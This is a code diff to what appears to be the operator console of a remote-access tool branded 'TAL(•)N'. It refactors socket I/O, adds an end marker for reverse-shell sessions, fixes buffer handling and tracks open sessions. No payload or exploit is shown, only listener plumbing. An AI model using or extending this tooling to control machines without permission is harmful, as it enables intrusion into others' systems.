@@ -90,6 +90,7 @@ class Session:
         try:
             self.connect()
             # self.handle_io_rev_shell()
+            set_nonblocking(sys.stdout)
             self.handle_io()
                 
             self.socket.close()
@@ -99,16 +100,14 @@ class Session:
 
     def handle_io_rev_shell(self):
         self.status = True
+        end_of_rev = "}shell finished EOF{"
         # set_nonblocking(sys.stdin)
-        set_nonblocking(sys.stdout)
-        while True and self.status: 
+        
+        while self.status: 
             sin = [self.conn, sys.stdin]  
             rs, _, _, = select.select(sin, [], [])
             if self.conn in rs:
-                self.recv_data()
-                if self.bytes == "}shell finished EOF{":
-                    self.status = False;
-                    break
+                self.recv_data(EOF=end_of_rev)
             if sys.stdin in rs:
                 # self.cmd = input()
                 self.cmd = sys.stdin.read(1080)
@@ -131,8 +130,9 @@ class Session:
                     self.cmd = "}shell"
                     self.send_data()
                     self.handle_io_rev_shell()
-                self.send_data()
-                self.recv_data()
+                else:
+                    self.send_data()
+                    self.recv_data()
 
     def prompt(self):
         prompt = ANSI("{fg.li_blue}TAL(•)N {fg.grey}[--|>{rs.all} ".format(
@@ -147,16 +147,21 @@ class Session:
         self.conn.setblocking(False)
         print(basic['B_CONN_ACCEPTED'].format(**globals()))
 
-    def recv_data(self):
+    def recv_data(self, EOF=None):
         self.bytes = b''
         while True:
             try:
                 self.bytes = self.conn.recv(self.buf_size)
-                # print(bytes)
-                # sys.stdout.buffer.write(bytes)
-                print(bytes.decode(), end="")
+                if EOF and EOF.encode() in self.bytes:
+                    self.bytes = self.bytes.replace(EOF.encode(), b'')
+                    print(self.bytes.decode())
+                    self.status = False
+                    break
+                print(self.bytes.decode(), end="")
+                # sys.stdout.buffer.write(self.bytes)
+                # print(bytes.decode("utf-8"), end="")
                 sys.stdout.flush()
-                if len(bytes) < self.buf_size:
+                if len(self.bytes) < self.buf_size:
                     break
             except(BlockingIOError):
                 continue
@@ -192,6 +197,7 @@ if __name__ == "__main__":
         elif cmd == "new":
             session = Session(host, port, buffer_size)
             print(basic['B_START_SES'].format(**globals()))
+            sessions.append(session)
             session.start()
             print("nice")
         else:
